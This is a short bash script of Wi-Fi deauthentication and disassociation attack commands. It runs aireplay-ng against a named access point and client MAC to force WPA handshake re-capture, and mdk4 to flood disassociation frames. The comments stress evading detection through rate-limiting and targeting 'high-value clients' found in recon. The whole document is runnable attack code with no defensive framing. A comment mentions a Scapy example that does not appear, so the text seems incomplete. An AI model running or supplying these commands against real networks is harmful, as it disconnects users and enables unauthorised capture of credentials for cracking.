#!/bin/bash
# Technique 1: Rate-limited deauth (1 burst every 30 seconds)
# Only need a single deauth to trigger handshake re-capture
for i in $(seq 1 5); do
  sudo aireplay-ng -0 1 -a 14:8C:4A:B4:F4:8C -c 20:3B:69:CE:88:3D wlan0mon
  sleep 30
done

# Technique 2: Target only high-value clients
# Instead of broadcast deauth, target specific client MACs
# identified during recon — this generates far fewer frames
sudo aireplay-ng -0 2 -a 14:8C:4A:B4:F4:8C -c 20:3B:69:CE:88:3D wlan0mon

# Technique 3: Disassociation instead of deauthentication
# aireplay-ng's -0 always sends deauth reason code 7 and cannot be changed
# (the Scapy example below can set an arbitrary reason code).
sudo mdk4 wlan0mon d -b target.txt -s 1    # -s = packets per second
